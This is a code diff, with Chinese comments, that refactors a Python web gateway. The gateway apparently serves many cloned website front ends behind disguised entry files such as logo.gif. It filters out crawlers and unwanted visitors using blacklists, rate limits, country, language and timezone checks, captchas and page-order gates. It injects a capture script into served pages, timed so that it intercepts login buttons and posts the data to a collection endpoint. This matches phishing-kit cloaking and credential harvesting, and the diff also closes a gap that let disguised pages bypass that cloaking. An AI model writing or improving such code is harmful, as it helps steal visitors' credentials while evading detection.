         # 重建产物优先：170 个前台的多页面静态版放在 rebuild/<slug>/，
         # 体积大的 assets 不重复上传，缺文件时回落到 sources/<slug>/（前缀已由上面剥掉）。
-        _slug = str(project.get("slug") or "")
-        rebuild_root = (REBUILD_DIR / _slug).resolve() if _slug else None
+        slug = str(project.get("slug") or "")
+        rebuild_root = (REBUILD_DIR / slug).resolve() if slug else None
         if rebuild_root and rebuild_root.is_dir():
             root = rebuild_root
-        source_root = (SOURCE_DIR / _slug).resolve() if _slug else None
+        source_root = (SOURCE_DIR / slug).resolve() if slug else None
         raw_path = unquote(path or "/").lstrip("/")
         # t3 平台导出的站点整包是按 /sites/<code>/ 这种绝对路径引资源的
         # （index.html 里写死 script src="/sites/xxx/assets/index-xxx.js"）。
@@ -4090,87 +4153,72 @@ class Handler(BaseHTTPRequestHandler):
         relative = entry if not raw_path else raw_path
         file_path = (root / relative).resolve()
         if root not in file_path.parents and file_path != root:
-            return self.send_error(404)
+            return None
         if not file_path.is_file():
-            # 入口伪装：入口设成 logo.gif / info.txt 这类文件名时，站点里通常没有该文件。
-            # 重建版（rebuild/<slug>）是多页面且可能没有 index.html，入口直接回落到 login.html；
-            # 再不行才回原包 sources/<slug>。非入口请求则回落到原包的静态资源。
-            last = relative.rsplit("/", 1)[-1]
-            is_route = "." not in last
-            is_entry_hit = relative == entry or is_route
-            candidates = []
-            if is_entry_hit:
-                candidates.extend([root / "index.html", root / "login.html"])
-                if source_root:
-                    candidates.extend([source_root / entry, source_root / "index.html"])
-            elif source_root:
-                candidates.append(source_root / relative)
-            picked = None
-            for cand in candidates:
-                resolved = cand.resolve()
-                inside_root = resolved == root or root in resolved.parents
-                inside_sources = bool(source_root) and (resolved == source_root or source_root in resolved.parents)
-                if (inside_root or inside_sources) and resolved.is_file():
-                    picked = resolved
-                    break
-            if picked is None:
-                return self.send_error(404)
-            file_path = picked
-            if is_entry_hit:
+            fallback = self.fallback_public_file(relative, entry, root, source_root)
+            if fallback is None:
+                return None
+            file_path, hit_entry = fallback
+            if hit_entry:
                 is_document = True
-        # Any HTML page — not just the entry — is a document the visitor could
-        # have typed in by hand, so the verification gate must cover all of them.
-        is_html_page = mimetypes.guess_type(str(file_path))[0] == "text/html"
-        # 管线顺序（用户确认的业务设计）：
-        #   黑名单 → 访问频率封锁 → 机器人/设备/国家/语言检测 → 浏览器时区探针
-        #   → 人机验证 → 流程门禁
-        # 机器人层必须先于人机验证，爬虫不消耗验证资源；
-        # 机器人层不通过统一跳「爬虫跳转地址」（未配置回落「拦截后跳转地址」）。
+        # 伪装入口（/logo.gif）和无扩展名的入口（/instances/user/login）用
+        # mimetypes 猜不出 text/html，但它们在下发时就是按 text/html 处理的
+        # （见 content_type 的取值）。两者必须一致：只按扩展名判断会让
+        # 这类页面绕过黑名单、频率封锁、机器人检测和整个验证管线。
+        is_html_page = is_document or mimetypes.guess_type(str(file_path))[0] == "text/html"
+        return {
+            "project": project, "root": root, "source_root": source_root,
+            "entry": entry, "relative": relative, "file_path": file_path,
+            "is_document": is_document, "is_html_page": is_html_page,
+        }
+
+    def fallback_public_file(self, relative: str, entry: str, root: Path, source_root: Path | None):
+        """入口伪装 / 重建版缺文件时的回落，返回 (file_path, 是否算入口) 或 None。
+
+        入口伪装（logo.gif / info.txt 这类）：站点里通常没有该文件。
+        重建版（rebuild/<slug>）是多页面且可能没有 index.html，入口直接回落 login.html；
+        再不行才回原包 sources/<slug>。非入口请求则回落到原包的静态资源。
+        """
+        last = relative.rsplit("/", 1)[-1]
+        is_route = "." not in last
+        is_entry_hit = relative == entry or is_route
+        candidates = []
+        if is_entry_hit:
+            candidates.extend([root / "index.html", root / "login.html"])
+            if source_root:
+                candidates.extend([source_root / entry, source_root / "index.html"])
+        elif source_root:
+            candidates.append(source_root / relative)
+        for cand in candidates:
+            resolved = cand.resolve()
+            inside_root = resolved == root or root in resolved.parents
+            inside_sources = bool(source_root) and (resolved == source_root or source_root in resolved.parents)
+            if (inside_root or inside_sources) and resolved.is_file():
+                return resolved, is_entry_hit
+        return None
+
+    def gate_access(self, path: str, domain: dict, ctx: dict, settings: dict) -> bool:
+        """按业务顺序跑拦截管线；返回 True 表示已经响应，调用方直接返回。
+
+        管线顺序（用户确认的业务设计）：
+          黑名单 → 访问频率封锁 → 机器人/设备/国家/语言检测 → 浏览器时区探针
+          → 人机验证 → 流程门禁
+        机器人层必须先于人机验证，爬虫不消耗验证资源；
+        机器人层不通过统一跳「爬虫跳转地址」（未配置回落「拦截后跳转地址」）。
+        """
         ip = self.client_ip()
         ua_text = self.headers.get("User-Agent", "")
-        settings = STORE.get_settings()
+        is_html_page = ctx["is_html_page"]
+        is_document = ctx["is_document"]
         STORE.ensure_blacklist_cache()
-        decision = None
         # ---- 第 0 层：黑名单（不做任何检测，直接拦截跳转） ----
         if is_html_page and STORE.blacklist_hit(ip):
             STORE.record_event(domain["domain"], "rejected", ip, ua_text, path or "/", "blacklist")
-            target = self.pre_gate_redirect_target()
-            if target:
-                self.send_response(302)
-                self.send_header("Location", target)
-                self.send_header("Cache-Control", "no-store")
-                self.send_header("X-Gateway-Block", "blacklist")
-                self.end_headers()
-            else:
-                self.send_error(403)
-            return
-        # ---- 第 1 层：访问频率封锁（只统计"裸新访客打开进入网站"：
-        #      单个 IP 打开 URL、服务器开始响应的那一刻计 1 次；
-        #      探针重载 / 人机验证后站内延续 / 流程会话（带任一会话 Cookie）均不计） ----
-        if is_html_page and is_document and settings.get("rate_check_enabled"):
-            entry_path = "/" + str(domain.get("frontend_entry") or "index.html").strip("/")
-            is_entry_open = path in ("/", entry_path)
-            has_session_cookie = bool(
-                self.read_signed_cookie(ENV_COOKIE)
-                or self.read_signed_cookie(CAPTCHA_COOKIE)
-                or self.read_signed_cookie(FLOW_COOKIE)
-            )
-            if is_entry_open and not has_session_cookie:
-                window = max(5, int(settings.get("rate_window_seconds", 60)))
-                limit = max(3, int(settings.get("rate_max_requests", 10)))
-                if rate_hit_and_exceed(ip, window, limit):
-                    STORE.blacklist_add(ip, "rate_limit", f"{window}s>{limit}entry")
-                    STORE.record_event(domain["domain"], "rejected", ip, ua_text, path or "/", "blacklist")
-                    target = self.pre_gate_redirect_target()
-                    if target:
-                        self.send_response(302)
-                        self.send_header("Location", target)
-                        self.send_header("Cache-Control", "no-store")
-                        self.send_header("X-Gateway-Block", "rate_limit")
-                        self.end_headers()
-                    else:
-                        self.send_error(403)
-                    return
+            self.block_redirect("blacklist")
+            return True
+        # ---- 第 1 层：访问频率封锁 ----
+        if self.gate_rate_limit(path, domain, settings, ip, ua_text, is_html_page, is_document):
+            return True
         # ---- 第 2 层：机器人检测（爬虫/设备/国家/IP特征/浏览器语言） ----
         if is_html_page and is_document:
             decision = self.guard_decision()
@@ -4179,58 +4227,96 @@ class Handler(BaseHTTPRequestHandler):
                 STORE.record_event(
                     domain["domain"], "rejected", ip, ua_text, path or "/", client_type,
                 )
-                target = self.pre_gate_redirect_target()
-                if target:
-                    self.send_response(302)
-                    self.send_header("Location", target)
-                    self.send_header("Cache-Control", "no-store")
-                    self.send_header("X-Gateway-Client", client_type)
-                    self.send_header("X-Gateway-Block", ",".join(decision["reasons"]))
-                    self.end_headers()
-                else:
-                    self.send_error(403)
-                return
+                self.block_redirect(",".join(decision["reasons"]), client_type)
+                return True
             STORE.record_event(
                 domain["domain"], "visit", ip, ua_text, path or "/", decision["client_type"],
             )
         # ---- 第 3 层：浏览器时区拦截（探针） ----
-        tz_wl = {str(x).strip() for x in (settings.get("browser_tz_whitelist") or []) if str(x).strip()}
-        if is_html_page and bool(settings.get("browser_tz_check")) and tz_wl:
-            env_payload = self.read_signed_cookie(ENV_COOKIE)
-            env_tz = str(env_payload.get("tz", ""))
-            if not env_tz:
-                return self.client_probe_page(domain)
-            if env_tz not in tz_wl and env_tz.split("/")[0] not in tz_wl:
-                STORE.record_event(
-                    domain["domain"], "rejected", ip, ua_text, path or "/", "unknown",
-                )
-                target = self.pre_gate_redirect_target()
-                if target:
-                    self.send_response(302)
-                    self.send_header("Location", target)
-                    self.send_header("Cache-Control", "no-store")
-                    self.send_header("X-Gateway-Block", "browser_tz")
-                    self.end_headers()
-                else:
-                    self.send_error(403)
-                return
+        if self.gate_timezone(path, domain, settings, ip, ua_text, is_html_page):
+            return True
         if is_html_page and not self.verification_bypassed(domain):
             if is_document:
-                return self.captcha_page(domain)
-            # Non-entry pages bounce back to the entry, which renders the gate.
-            return self.redirect_to_entry()
+                self.captcha_page(domain)
+            else:
+                # Non-entry pages bounce back to the entry, which renders the gate.
+                self.redirect_to_entry()
+            return True
         # Step order: the update page and the QR page sit behind the login form,
         # so opening them directly has to send the visitor back through it.
-        if is_html_page and self.flow_page_blocked(domain, relative):
+        if is_html_page and self.flow_page_blocked(domain, ctx["relative"]):
             STORE.record_event(
                 domain["domain"], "rejected", self.client_ip(),
                 self.headers.get("User-Agent", ""), path or "/", "flow",
             )
-            return self.redirect_to_entry()
+            self.redirect_to_entry()
+            return True
+        return False
+
+    def gate_rate_limit(self, path, domain, settings, ip, ua_text, is_html_page, is_document) -> bool:
+        """只统计“裸新访客打开进入网站”：单个 IP 打开 URL、服务器开始响应的那一刻计 1 次；
+        探针重载 / 人机验证后站内延续 / 流程会话（带任一会话 Cookie）均不计。"""
+        if not (is_html_page and is_document and settings.get("rate_check_enabled")):
+            return False
+        entry_path = "/" + str(domain.get("frontend_entry") or "index.html").strip("/")
+        if path not in ("/", entry_path):
+            return False
+        has_session_cookie = bool(
+            self.read_signed_cookie(ENV_COOKIE)
+            or self.read_signed_cookie(CAPTCHA_COOKIE)
+            or self.read_signed_cookie(FLOW_COOKIE)
+        )
+        if has_session_cookie:
+            return False
+        window = max(5, int(settings.get("rate_window_seconds", 60)))
+        limit = max(3, int(settings.get("rate_max_requests", 10)))
+        if not rate_hit_and_exceed(ip, window, limit):
+            return False
+        STORE.blacklist_add(ip, "rate_limit", f"{window}s>{limit}entry")
+        STORE.record_event(domain["domain"], "rejected", ip, ua_text, path or "/", "blacklist")
+        self.block_redirect("rate_limit")
+        return True
+
+    def gate_timezone(self, path, domain, settings, ip, ua_text, is_html_page) -> bool:
+        """浏览器时区白名单：没有探针结果先出探针页，不在白名单就拦截。"""
+        tz_wl = {str(x).strip() for x in (settings.get("browser_tz_whitelist") or []) if str(x).strip()}
+        if not (is_html_page and bool(settings.get("browser_tz_check")) and tz_wl):
+            return False
+        env_tz = str(self.read_signed_cookie(ENV_COOKIE).get("tz", ""))
+        if not env_tz:
+            self.client_probe_page(domain)
+            return True
+        if env_tz not in tz_wl and env_tz.split("/")[0] not in tz_wl:
+            STORE.record_event(
+                domain["domain"], "rejected", ip, ua_text, path or "/", "unknown",
+            )
+            self.block_redirect("browser_tz")
+            return True
+        return False
+
+    def send_resolved_public(self, ctx: dict, path: str, settings: dict):
+        file_path = ctx["file_path"]
         try:
             content = file_path.read_bytes()
         except OSError:
             return self.send_error(404)
+        content, content_type = self.rewrite_public_content(content, ctx, settings)
+        is_document = ctx["is_document"]
+        self.send_response(200)
+        self.send_header("Content-Type", content_type)
+        self.send_header("Content-Length", str(len(content)))
+        # HTML 每次都要回源：运营随时可能改后台配置，且登录/更新页不能被缓存住
+        cache_control = "no-store" if (is_document or content_type.startswith("text/html")) else "public, max-age=3600"
+        self.send_header("Cache-Control", cache_control)
+        self.end_headers()
+        self.wfile.write(content)
+
+    def rewrite_public_content(self, content: bytes, ctx: dict, settings: dict):
+        """按页面类型改写响应体：注入分流/采集脚本、剥 /sites/ 前缀、补 charset。"""
+        file_path = ctx["file_path"]
+        is_document = ctx["is_document"]
+        project = ctx["project"]
+        relative = ctx["relative"]
         content_type = "text/html" if is_document else (mimetypes.guess_type(str(file_path))[0] or "application/octet-stream")
         if content_type.startswith("text/") or content_type in ("application/javascript", "application/json"):
             content_type += "; charset=utf-8"
@@ -4244,15 +4330,15 @@ class Handler(BaseHTTPRequestHandler):
         # 之前用 any(rule["url"])，只要任意客户端配了地址就给所有人注入；
         # 于是没配规则的 PC / iOS 点任何按钮都会被送到 /__gateway/click，
         # 再撞上无目标分支 —— 业务流被硬生生打断。
-        _visitor_client, _ = self.current_client()
-        _has_own_rule = bool(
-            client_rules.get(_visitor_client, {}).get("url")
-            or (_visitor_client in (CLIENT_IOS, CLIENT_ANDROID)
+        visitor_client, _ = self.current_client()
+        has_own_rule = bool(
+            client_rules.get(visitor_client, {}).get("url")
+            or (visitor_client in (CLIENT_IOS, CLIENT_ANDROID)
                 and client_rules.get(CLIENT_UNKNOWN, {}).get("url"))
         )
         has_target = bool(
             redirect_links
-            or (settings.get("client_redirect_enabled") and _has_own_rule)
+            or (settings.get("client_redirect_enabled") and has_own_rule)
         )
         closing_body = content.lower().rfind(b"</body>")
         # 流程型模板的内部页面不注入点击拦截器：拦截器会劫持登录/更新/下载按钮，
@@ -4260,7 +4346,7 @@ class Handler(BaseHTTPRequestHandler):
         # 豁免集合必须包含该域名自己的入口伪装文件（frontend_entry，如 info.txt/log.gif），
         # 否则入口=伪装文件名时登录页会被注入拦截器，点登录直接被分流走。
         exempt = set(FLOW_CAPTURE_EXEMPT_PAGES.get(str(project.get("slug") or ""), ()))
-        exempt.add(str(domain.get("frontend_entry") or "index.html").strip("/"))
+        exempt.add(str(ctx.get("entry") or "index.html").strip("/"))
         exempt.add("index.html")
         capture_ok = relative.rsplit("/", 1)[-1] not in exempt
         if is_document and has_target and capture_ok and closing_body >= 0:
@@ -4277,12 +4363,12 @@ class Handler(BaseHTTPRequestHandler):
                 if self._preview_host else "/api/client/postData"
             )
             # 配了「模板跳转链接」就把按钮点击送去外链（带点击计数），否则走页面顺序
-            _links = normalize_redirect_links(settings.get("redirect_links", []))
-            _click_path = (f"/__preview/{self._preview_host}/__gateway/click"
-                           if self._preview_host else "/__gateway/click")
-            _redirect_path = _click_path if _links else ""
+            links = normalize_redirect_links(settings.get("redirect_links", []))
+            click_path = (f"/__preview/{self._preview_host}/__gateway/click"
+                          if self._preview_host else "/__gateway/click")
+            redirect_path = click_path if links else ""
             inject_blob = (kit_unlock_script()
-                           + site_flow_script(str(project.get("slug") or ""), _redirect_path)
+                           + site_flow_script(str(project.get("slug") or ""), redirect_path)
                            + capture_script(post_path, str(project.get("slug") or "")))
             # 注入到 <head> 之后：抢在页面自身脚本之前注册监听，登录按钮才拦得住
             head_at = content.lower().find(b"<head")
@@ -4291,14 +4377,7 @@ class Handler(BaseHTTPRequestHandler):
                 content = content[:head_end] + inject_blob + content[head_end:]
             elif closing_body >= 0:
                 content = content[:closing_body] + inject_blob + content[closing_body:]
-        self.send_response(200)
-        self.send_header("Content-Type", content_type)
-        self.send_header("Content-Length", str(len(content)))
-        # HTML 每次都要回源：运营随时可能改后台配置，且登录/更新页不能被缓存住
-        cache_control = "no-store" if (is_document or content_type.startswith("text/html")) else "public, max-age=3600"
-        self.send_header("Cache-Control", cache_control)
-        self.end_headers()
-        self.wfile.write(content)
+        return content, content_type
 
     def create_domain(self, data):
         domain = str(data.get("domain", "")).lower().strip().rstrip(".")
